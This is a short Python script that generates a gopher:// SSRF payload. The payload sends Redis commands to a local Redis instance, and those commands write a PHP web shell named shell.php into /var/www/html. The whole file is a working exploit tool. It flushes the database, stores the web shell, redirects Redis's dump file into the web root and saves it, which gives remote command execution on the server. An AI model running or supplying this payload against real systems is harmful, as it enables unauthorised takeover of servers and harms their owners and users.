#!/usr/bin/env python3
import urllib3
import urllib.parse

protocol = 'gopher://'
ip = '127.0.0.1'
port = '6379'
shell = '\n\n<?php system($_GET["cmd"]);?>\n\n'
fname = 'shell.php'
path = '/var/www/html'

cmd = [
    'flushall',
    'set 1 {}'.format(shell.replace(' ', "${IFS}")),
    'config set dir {}'.format(path),
    'config set dbfilename {}'.format(fname),
    'save',
]

payload = protocol + ip + ':' + port + '/_'


def redis_format(arr):
    CRLF = '\r\n'
    redis_arr = arr.split(' ')
    cmd = '*' + str(len(redis_arr))

    for x in redis_arr:
        cmd += CRLF + "$" + str(len((x.replace('${IFS}', " ")))) + CRLF + x.replace('${IFS}', ' ')

    cmd += CRLF

    return cmd

if __name__=="__main__":
    for x in cmd:
        #payload += urllib3.quote(redis_format(x))
        payload += urllib.parse.quote(redis_format(x))

    print(payload)
